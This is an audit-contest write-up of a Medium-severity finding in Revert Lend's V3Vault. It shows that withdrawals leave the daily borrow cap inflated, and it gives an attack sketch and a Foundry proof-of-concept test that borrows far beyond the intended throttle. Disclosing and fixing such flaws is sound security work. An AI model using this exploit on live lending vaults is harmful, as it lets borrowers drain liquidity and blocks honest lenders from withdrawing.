# Reserve Contest
Revert Lend (Cantina) || V3Vault — daily borrow throttle / lender DOS || Mar 18, 2026 → Mar 25, 2026 on [Cantina](https://cantina.xyz/competitions/efb6f308-f13b-4110-aff8-0d67181608dd/leaderboard)

**Platform:** Cantina · **My submission:** **#810** · **Result:** Duplicate of **#162** (confirmed primary: *Per-token collateral exposure limit can be bypassed via multi-call flash deposit sandwich around `borrow()`*) · **Severity (sponsor):** Medium

My Finding Summay
|ID|Title|Severity|
|:-:|:---|:------:|
|[M-01](#m-01-attackers-can-bypass-daily-borrow-throttle-by-inflating-lent-base-then-withdrawing-causing-dos-on-withdrawals-for-lenders)|Attackers can bypass daily borrow throttle by inflating `lent base` then withdrawing, causing DoS on withdrawals for lenders|MEDIUM|

---

## [M-01] Attackers can bypass daily borrow throttle by inflating `lent base` then withdrawing, causing DoS on withdrawals for lenders

### Summary
Daily debt limit can be artificially increased and will stay inflated, ending up much higher than the configured percentage (e.g. ~10× the intended limit).

### Finding Description
The `V3Vault` has a daily debt throttle that limits how much can be borrowed in a single day (roughly 10% of total lent). This protects lenders from utilization spikes: if someone borrows too fast, the cap blocks further borrows until the next day.

The cap is recomputed only when certain actions happen: `borrow`, `repay`, `liquidate`, or `setLimits`. It uses `totalSupply()` (total lent) to compute the new cap. **Withdraw / redeem do not trigger a reset** and do not update `dailyDebtIncreaseLimitLeft`.

References (Revert Lend repo):

- [`_withdraw`](https://github.com/revert-finance/lend/blob/2bb022ee862c0f7f2010505f4d697f33827312ef/src/V3Vault.sol#L971-L1004) — lend reset only; no daily debt reset
- [`_calculateDailyIncreaseLimit`](https://github.com/revert-finance/lend/blob/2bb022ee862c0f7f2010505f4d697f33827312ef/src/V3Vault.sol#L1355-L1362) — cap from `totalSupply()`
- [`borrow`](https://github.com/revert-finance/lend/blob/2bb022ee862c0f7f2010505f4d697f33827312ef/src/V3Vault.sol#L600) — example debt daily reset callsite
- [`_resetDailyDebtIncreaseLimit`](https://github.com/revert-finance/lend/blob/2bb022ee862c0f7f2010505f4d697f33827312ef/src/V3Vault.sol#L1345-L1353)

`_resetDailyDebtIncreaseLimit` is also used from `repay`, `liquidate`, and `setLimits`; it is **not** called from `_withdraw` / `redeem`.

**File:** `src/V3Vault.sol`

```solidity
// Withdraw does not reset daily debt limit
function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
    internal
    returns (uint256 assets, uint256 shares)
{
    (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();
    _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);  // only LEND limit reset
    // NOTE: _resetDailyDebtIncreaseLimit is NOT called here
    // ...
    dailyLendIncreaseLimitLeft = dailyLendIncreaseLimitLeft + assets;
    emit Withdraw(msg.sender, receiver, owner, assets, shares);
}

// Cap computed from totalSupply; never rescaled on withdraw
function _calculateDailyIncreaseLimit(uint256 lendExchangeRateX96, uint256 minLimit, uint256 limitFactorX32)
    private view returns (uint256)
{
    uint256 limit = _convertToAssets(totalSupply(), lendExchangeRateX96, Math.Rounding.Up) * limitFactorX32 / Q32;
    return minLimit > limit ? minLimit : limit;
}

// Reset only on borrow/repay/liquidate/setLimits
// borrow
_resetDailyDebtIncreaseLimit(newLendExchangeRateX96, false);

// repay
_resetDailyDebtIncreaseLimit(newLendExchangeRateX96, false);

// liquidate
_resetDailyDebtIncreaseLimit(...)

// setLimits
_resetDailyDebtIncreaseLimit(newLendExchangeRateX96, true);
```

**Attack sketch**

1. Temporarily deposit a large amount (e.g. 900k USDC) to push total lent to ~1M.
2. Wait for the next day (or trigger a reset via `repay` / `borrow`).
3. Reset runs → cap is set to ~10% of 1M = 100k.
4. Withdraw 900k.

After that: real lender base is ~100k, but `dailyDebtIncreaseLimitLeft` is still ~100k (from the inflated reset). The intended cap for 100k base would be ~10k.

A borrower can then borrow up to ~100k in one day (≈10× the intended throttle), exhausting liquidity and leaving lenders unable to withdraw.

**Root cause (invariant break)**

- `_resetDailyDebtIncreaseLimit` is only called from `borrow`, `repay`, `liquidate`, and `setLimits`; never from `_withdraw` / `redeem`.
- `dailyDebtIncreaseLimitLeft` is decreased on `borrow`, increased on `repay`/`liquidate`. **Withdraw does not touch it.**
- `_calculateDailyIncreaseLimit` uses `totalSupply()`. When the cap is reset during an inflated state, it reflects inflated `totalSupply()`; after lenders withdraw, `totalSupply` drops but **no new reset** runs — `dailyDebtIncreaseLimitLeft` stays inflated.

The invariant “daily borrow cap ≈ 10% of total lent” breaks when lenders withdraw after a reset that used a larger `totalSupply`.

### Impact Explanation
1. **Circuit breaker bypass:** `dailyDebtIncreaseLimitLeft` can remain at an inflated value after withdraw; throttle no longer reflects true lender base.
2. **Utilization spike:** With 100k real base and 100k borrowable headroom, most liquidity can be borrowed in one day instead of ~10%.
3. **Liquidity risk:** Lenders may be unable to withdraw because funds are borrowed faster than the cap should allow (DOS on withdrawals).

### Likelihood Explanation
Withdrawals happen routinely; the inflated TVL step can be done in the same window as the reset, so the mis-sync between cap and real `totalSupply` is practical.

### Proof of Concept
Add the test below to `test/integration/uniswap/V3Vault.t.sol` (or an equivalent integration test file in the contest repo). Tests that fork mainnet need a **private** RPC URL in your environment — use your own provider key locally; do not commit secrets.

```solidity
function test_DailyDebtCapBypassViaInflatedLenderBase() external {
    address attacker = address(0xBEEF);
    uint256 honestBase = 100_000 * 1e6;   // 100k USDC
    uint256 attackerInflate = 900_000 * 1e6; // 900k USDC

    vault.setLimits(0, 15_000_000e6, 15_000_000e6, 12_000_000e6, 12_000_000e6);

    _deposit(honestBase, WHALE_ACCOUNT);

    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    NPM.approve(address(vault), TEST_NFT_DAI_WETH);
    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    vault.create(TEST_NFT_DAI_WETH, TEST_NFT_DAI_WETH_ACCOUNT);
    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    vault.borrow(TEST_NFT_DAI_WETH, 1);

    vault.setLimits(0, 15_000_000e6, 15_000_000e6, 12_000_000e6, 0);

    vm.prank(WHALE_ACCOUNT);
    USDC.transfer(attacker, attackerInflate);
    vm.prank(attacker);
    USDC.approve(address(vault), attackerInflate);
    vm.prank(attacker);
    vault.deposit(attackerInflate, attacker);

    uint256 totalLentAfterInflate = vault.totalAssets();
    assertGt(totalLentAfterInflate, honestBase, "total lent inflated");

    vm.warp(block.timestamp + 1 days);
    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    USDC.approve(address(vault), 1);
    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    vault.repay(TEST_NFT_DAI_WETH, 1, false);

    uint256 inflatedCap = vault.dailyDebtIncreaseLimitLeft();
    assertGt(inflatedCap, honestBase * vault.MAX_DAILY_DEBT_INCREASE_X32() / Q32 / 2,
        "cap should reflect inflated 1M base (~100k), not 100k base (~10k)");

    uint256 attackerShares = vault.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(attackerShares, attacker, attacker);

    uint256 realLentAfterWithdraw = vault.totalAssets();
    assertApproxEqAbs(realLentAfterWithdraw, honestBase, 1000, "real base ~100k");

    uint256 capAfterWithdraw = vault.dailyDebtIncreaseLimitLeft();
    assertEq(capAfterWithdraw, inflatedCap, "cap unchanged by withdraw - the bug");

    uint256 intendedCapFor100k = honestBase * vault.MAX_DAILY_DEBT_INCREASE_X32() / Q32;
    assertGt(capAfterWithdraw, intendedCapFor100k,
        "actual cap exceeds intended 10% of real base");

    uint256 borrowBypass = 45_000 * 1e6;
    assertLt(intendedCapFor100k, borrowBypass, "45k > intended ~10k cap");
    assertLe(borrowBypass, capAfterWithdraw, "45k within inflated cap");

    vm.prank(TEST_NFT_DAI_WETH_ACCOUNT);
    vault.borrow(TEST_NFT_DAI_WETH, borrowBypass);

    (uint256 debt,,,,) = vault.loanInfo(TEST_NFT_DAI_WETH);
    assertEq(debt, borrowBypass);
    assertGt(debt, intendedCapFor100k,
        "borrowed more than 10% of real base - daily throttle bypassed");

    assertEq(vault.dailyDebtIncreaseLimitLeft(), inflatedCap - borrowBypass);
    assertGt(vault.dailyDebtIncreaseLimitLeft(), intendedCapFor100k,
        "remaining headroom still exceeds intended daily cap for 100k base");

    uint256 utilizationX32 = (debt * Q32) / realLentAfterWithdraw;
    assertGt(utilizationX32, vault.MAX_DAILY_DEBT_INCREASE_X32() * 4,
        "utilization far exceeds intended daily throttle (~10%)");
}
```

### Recommendation
Call `_resetDailyDebtIncreaseLimit` inside `_withdraw` when lender balance changes (or otherwise rescale `dailyDebtIncreaseLimitLeft` to the post-withdraw `totalSupply()`), so the cap tracks the true lent base after withdrawals.

### Related duplicates (contest)
Grouped with **#162** and other reports on flash-deposit / `totalSupply` manipulation around borrow limits (e.g. #202, #238, #267); **#810** marked duplicate of **#162**.
